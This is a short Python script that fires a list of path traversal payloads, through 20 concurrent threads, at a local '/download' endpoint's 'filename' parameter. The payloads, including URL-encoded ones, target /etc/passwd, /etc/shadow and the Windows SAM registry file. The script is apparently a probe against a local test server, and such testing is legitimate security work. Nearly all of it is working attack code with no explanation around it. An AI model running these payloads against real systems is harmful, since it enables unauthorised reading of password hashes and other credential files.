import requests 
from concurrent.futures import ThreadPoolExecutor

def run():
    url = "http://127.0.0.1:5000/download"


    path_traversal_payloads = [
        "../",                          
        "../../",                       
        "../../../etc/passwd",         
        "../../../../../../etc/shadow", 
        "..\\..\\windows\\system32\\config\\sam", 
        "%2e%2e%2f%2e%2e%2f",          
        "..%2f..%2f etc/passwd",        
    ]

    session = requests.Session()
    with ThreadPoolExecutor(max_workers=20) as executor:
        for payload in path_traversal_payloads:
            executor.submit(session.get, url, params={"filename": payload})


    # for payload in path_traversal_payloads:
    #     response = requests.get(url, params={"filename": payload})
    #     print(f"Payload: {payload} | Response Code: {response.status_code}")

if __name__ == "__main__":
    run()